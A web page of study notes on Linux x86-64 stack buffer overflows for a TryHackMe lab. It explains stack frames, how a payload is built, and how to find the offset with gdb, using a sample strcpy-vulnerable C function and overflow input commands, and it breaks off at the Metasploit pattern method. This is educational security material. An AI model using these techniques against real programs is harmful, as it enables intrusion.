<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-hacker/bufferoverflow/x86" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Linux x86-64 Buffer Overflow Exploitation - Complete GDB and Pwntools Guide | The Uncommon Engineer</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" property="og:image" content="https://www.uncommonengineer.com/img/social-card.png"><meta data-rh="true" name="twitter:image" content="https://www.uncommonengineer.com/img/social-card.png"><meta data-rh="true" property="og:url" content="https://www.uncommonengineer.com/docs/hacker/bufferoverflow/x86"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Linux x86-64 Buffer Overflow Exploitation - Complete GDB and Pwntools Guide | The Uncommon Engineer"><meta data-rh="true" name="description" content="Comprehensive guide to Linux buffer overflow exploitation on x86-64 architecture using GDB, pwntools, and modern exploitation techniques."><meta data-rh="true" property="og:description" content="Comprehensive guide to Linux buffer overflow exploitation on x86-64 architecture using GDB, pwntools, and modern exploitation techniques."><meta data-rh="true" name="keywords" content="linux buffer overflow,x86-64 exploitation,gdb debugging,pwntools,linux exploitation,stack overflow,ret2libc"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://www.uncommonengineer.com/docs/hacker/bufferoverflow/x86"><link data-rh="true" rel="alternate" href="https://www.uncommonengineer.com/docs/hacker/bufferoverflow/x86" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.uncommonengineer.com/docs/hacker/bufferoverflow/x86" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://9UFF3RBJQ9-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"üè¥‚Äç‚ò†Ô∏è Hacker","item":"https://www.uncommonengineer.com/docs/category/Ô∏è-hacker"},{"@type":"ListItem","position":2,"name":"Linux x86-64 Buffer Overflow Exploitation - Complete GDB and Pwntools Guide","item":"https://www.uncommonengineer.com/docs/hacker/bufferoverflow/x86"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="The Uncommon Engineer RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="The Uncommon Engineer Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="The Uncommon Engineer" href="/opensearch.xml">

<link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-DMRNTVGLRC"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-DMRNTVGLRC",{anonymize_ip:!0})</script>

<script src="/js/console-clue.js"></script>
<script src="/js/metricool.js"></script>
<script src="https://subscribe-forms.beehiiv.com/embed.js" async></script><link rel="stylesheet" href="/assets/css/styles.5170efae.css">
<script src="/assets/js/runtime~main.3d5cd519.js" defer="defer"></script>
<script src="/assets/js/main.727d0b4f.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="dark";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/profile.svg" alt="The Uncommon Engineer" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/profile.svg" alt="The Uncommon Engineer" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Uncommon Engineer</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/">Technical</a><a class="navbar__item navbar__link" href="/blog/">Analysis &amp; Essays</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/about/">About</a><a class="navbar__item navbar__link" href="/projects/">Projects</a><a class="navbar__item navbar__link" href="/changelog/">Changelog</a><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/">‚ñ∂ Start Here</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/books/reading-list">üìö Books &amp; Papers</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/study/SCS-C01/">üìó Study</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item red"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/category/Ô∏è-hacker">üè¥‚Äç‚ò†Ô∏è Hacker</a><button aria-label="Collapse sidebar category &#x27;üè¥‚Äç‚ò†Ô∏è Hacker&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/search">16 Essential Search Engines for Penetration Testing and Reconnaissance</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/hacker/tryhackme/adbasics">TryHackMe</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/hacker/hackthebox/traverxec">HackTheBox</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/rtfm">Red Team Field Manual (RTFM) - Essential Commands and Techniques</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/HowToDecodeStuff">Cryptography and Decoding Techniques for CTF and Penetration Testing</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/hacker/bufferoverflow/windows">Buffer Overflow</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/bufferoverflow/windows">Windows x86-64 Buffer Overflow Exploitation Guide</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/hacker/bufferoverflow/x86">Linux x86-64 Buffer Overflow Exploitation - Complete GDB and Pwntools Guide</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/bufferoverflow/resources">Buffer Overflow Resources, Tips, and Techniques - Exploitation Learning Materials</a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/acme">ACME Evil Corp Investigation - Digital Forensics and Threat Analysis</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/techforgood">Tech for Good Cryptography Challenge - Secret Message Decryption CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/hacker/RNZ-online-complaint">Complaint: RNZ &#x27;New Gaza&#x27; Article</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed red"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/-engineer">üíª Engineer</a><button aria-label="Expand sidebar category &#x27;üíª Engineer&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/archive/docker-wordpress/docker-wordpress-1">üóÉ Archive</a></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/Ô∏è-hacker"><span>üè¥‚Äç‚ò†Ô∏è Hacker</span></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Buffer Overflow</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Linux x86-64 Buffer Overflow Exploitation - Complete GDB and Pwntools Guide</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Linux x86-64 Buffer Overflow Exploitation - Complete GDB and Pwntools Guide</h1></header><div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>Notes on the THM <a href="https://tryhackme.com/room/bof1" target="_blank" rel="noopener noreferrer">&#x27;Buffer Overflow&#x27;</a> Room, looking specifically at Linux x86-64 programs. The room recommends using radare2 (r2) but it was easier to use <code>gdb</code> instead.</p></div></div>
<p>Some preliminary notes and knowledge around the stack so I can try to understand what is happening.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-stack">The Stack<a href="#the-stack" class="hash-link" aria-label="Direct link to The Stack" title="Direct link to The Stack">‚Äã</a></h2>
<p>The stack is the place in memory where your local variables and function arguments go.</p>
<p>Your application address space looks like this:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">high addresses</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  _____________</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"> [_____________]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"> [    stack    ]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"> [_____________]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"> [             ]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"> [             ]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"> [_____________]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"> [____heap_____]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"> [___globals___]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"> [____code_____]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"> [_____________]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">low addresses</span><br></span></code></pre></div></div>
<p>The &quot;heap&quot; grows &quot;upward&quot;, and the &quot;stack&quot; grows &quot;downward&quot;- so the &quot;top&quot; of the stack if you look at the diagram is technically the &quot;bottom&quot;, cos it grows &quot;downward&quot;.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="stack-frame">Stack Frame<a href="#stack-frame" class="hash-link" aria-label="Direct link to Stack Frame" title="Direct link to Stack Frame">‚Äã</a></h3>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>Reference <a href="https://www.youtube.com/watch?v=jVzSBkbfdiw" target="_blank" rel="noopener noreferrer">The Call Stack and Stack Overflows (example in C)</a></p></div></div>
<p>Every time you call a function a chunk of memory is allocated to the &quot;top&quot; of the stack, this is called the <code>Stack Frame</code>, and holds the args, local variables and return address to jump back to, for that function call.</p>
<p>These Stack Frames are <code>PUSH</code> onto the stack:</p>
<p>e.g.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">main (locals, args, return)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">printf(locals, args, return)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">malloc(locals, args, return)</span><br></span></code></pre></div></div>
<p>When the function &quot;returns&quot;, the stack frame is removed with POP</p>
<table><thead><tr><th style="text-align:center">stack bottom</th></tr></thead><tbody><tr><td style="text-align:center">return address</td></tr><tr><td style="text-align:center">saved registers</td></tr><tr><td style="text-align:center">buffer: function</td></tr><tr><td style="text-align:center">stack top</td></tr></tbody></table>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-overflow">The Overflow<a href="#the-overflow" class="hash-link" aria-label="Direct link to The Overflow" title="Direct link to The Overflow">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>The Cyber Mentor&#x27;s notes on the anatomy of the stack, with regard to overflows, are the most clear I&#x27;ve read online: <a href="https://tcm-sec.com/buffer-overflows-made-easy/" target="_blank" rel="noopener noreferrer">&quot;Buffer Overflows Made Easy&quot;</a>. This section paraphrases a lot fo CM&#x27;s work, so full credit to him for the basis of my notes.</p></div></div>
<p>The stack we&#x27;re most concerned about in an overflow is a &quot;memory stack&quot; with the 4 main components</p>
<ul>
<li>ESP - stack pointer</li>
<li>Buffer Space</li>
<li>EBP - base pointer</li>
<li>EIP - instruction pointer / return address</li>
</ul>
<p>We start with this as our programs stack:</p>
<p><img decoding="async" loading="lazy" alt="stack frame" src="/assets/images/stackframe-1-1cd59f27fb5c80f7c189de6dbe3bf56b.svg" width="380" height="381" class="img_ev3q"></p>
<p>It&#x27;s called a &quot;buffer overflow&quot; cos that <code>Buffer Space</code> you see there, is what we&#x27;re trying to <em>overflow</em>.</p>
<p>We can identify it is vulnerable to an overflow a couple of ways:</p>
<ol>
<li>viewing sourcecode and seeing vulnerable code e.g. <code>strcpy</code></li>
<li>&quot;fuzzing&quot; where we send bytes at a function the application exposes and seeing where it &quot;overflows&quot; i.e. crashes and overwrites the EIP</li>
</ol>
<p><img decoding="async" loading="lazy" alt="buffer overflow" src="/assets/images/stackoverflow-2-a7237f043b3f3c667dc2af5cb2db42f8.svg" width="900" height="424" class="img_ev3q"></p>
<p>As you can see, the <code>Buffer Space</code> has been overflowed, all the way to us being able to write a bunch of <code>A</code>&#x27;s into the EIP register, which means we control what the value of this register.</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>Why do we care about the EIP?</div><div class="admonitionContent_BuS1"><p>This is the return address to go to when the stack frame completes executing, if we control this, we control &quot;where&quot; the program executes next. And we want to point that to whever our shellcode is.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-payload">The Payload<a href="#the-payload" class="hash-link" aria-label="Direct link to The Payload" title="Direct link to The Payload">‚Äã</a></h3>
<p>After reviewing a lot of the literature on buffer overflowing methods, what makes sense to me is starting at the end goal and working backwards.</p>
<p>Ultimately, we want a &quot;<strong>payload</strong>&quot; that we fire at the overflow entrypoint and pops us a shell.</p>
<p>This payload is essentially = <code>offset</code> + <code>return address</code></p>
<p>But the offset is made up of the following:</p>
<p><img decoding="async" loading="lazy" alt="payload" src="/assets/images/payload-9d657796cce793bd096082e202665c20.svg" width="860" height="220" class="img_ev3q"></p>
<p>In terms of cli input, this looks like this in <code>gdb</code>:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print $nop_sled + $shellcode + $alignment + $return_address&quot;)</span><br></span></code></pre></div></div>
<p>Once we find the size of the Offset, we can determine what byte sizes to allocate to the other components i.e. the NOP sled, Shellcode and Alignment parts.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="find-the-offset">Find the Offset<a href="#find-the-offset" class="hash-link" aria-label="Direct link to Find the Offset" title="Direct link to Find the Offset">‚Äã</a></h3>
<blockquote>
<p>What&#x27;s the Offset?</p>
</blockquote>
<p>The <code>offset</code> is the number of bytes all the way up to, but not overwriting the EIP:</p>
<p><img decoding="async" loading="lazy" alt="buffer overflow" src="/assets/images/stackoffset-3-e2e11408bce8063523c5d331a6440383.svg" width="580" height="385" class="img_ev3q"></p>
<blockquote>
<p>How do we find how big the offset is?</p>
</blockquote>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="manual-method">Manual Method<a href="#manual-method" class="hash-link" aria-label="Direct link to Manual Method" title="Direct link to Manual Method">‚Äã</a></h4>
<p>As an example, if we have sourcecode like this:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">copy_arg</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token keyword" style="color:rgb(127, 219, 202)">char</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token plain">string</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token keyword" style="color:rgb(127, 219, 202)">char</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">140</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token function" style="color:rgb(130, 170, 255)">strcpy</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token function" style="color:rgb(130, 170, 255)">printf</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;%s\n&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token keyword" style="color:rgb(127, 219, 202)">return</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><br></span></code></pre></div></div>
<blockquote>
<p>What do we know?</p>
</blockquote>
<p>We know our buffer is <code>140</code> bytes.</p>
<p>We know <code>$rbp</code> is <code>8</code> bytes (we know the it&#x27;s 8 bytes because we are on an <code>x86_64</code> i.e the <a href="https://en.wikipedia.org/wiki/X86-64" target="_blank" rel="noopener noreferrer">64 bit version of the x86 instruction set</a>) so we try sending a payload of <code>148 + n</code> until the program crashes.</p>
<p>At the very least, we know our offset is <em>at least</em> <code>148</code> bytes.</p>
<p>If we&#x27;ve loaded our program into <code>gdb</code> we&#x27;ll send our overflow input like this, choosing to add <code>8</code> bytes arbitrarily and incrementing it until the program crashes:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;A&#x27;*(148+8))</span><br></span></code></pre></div></div>
<p>We inspect the return address when it crashes, looking for this:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000414141414141 in ?? ()</span><br></span></code></pre></div></div>
<p>this is the <code>EIP</code> and it&#x27;s showing it&#x27;s overwritten with a bunch of <code>A</code>&#x27;s i.e. we&#x27;ve overflowed the buffer, and overwritten everything up to and including the EIP.</p>
<p>We keep increasing <code>n</code> until we see the <code>\x41</code>&#x27;s, when we overshoot it, the <code>\x41</code>&#x27;s disappear.</p>
<p>In the example above, the return address turns out to be <code>6-bytes</code> long before the next <code>n</code> increment overshoots it.</p>
<p>The final number <code>(148 + n) - 6</code> is our &quot;offset&quot; i.e. the size of the buffer right up to the start of the return address.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="metsploit-framework-method">Metsploit Framework Method<a href="#metsploit-framework-method" class="hash-link" aria-label="Direct link to Metsploit Framework Method" title="Direct link to Metsploit Framework Method">‚Äã</a></h4>
<p>I haven&#x27;t done this myself, but <a href="https://l1ge.github.io/tryhackme_bof1/" target="_blank" rel="noopener noreferrer">l1ge&#x27;s write-up</a> does an excellent job of explaining it.</p>
<p>In summary:</p>
<ul>
<li>use <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l &lt;buffer size /&gt;</code>, to create a payload string pattern.</li>
<li>send it at the application as input</li>
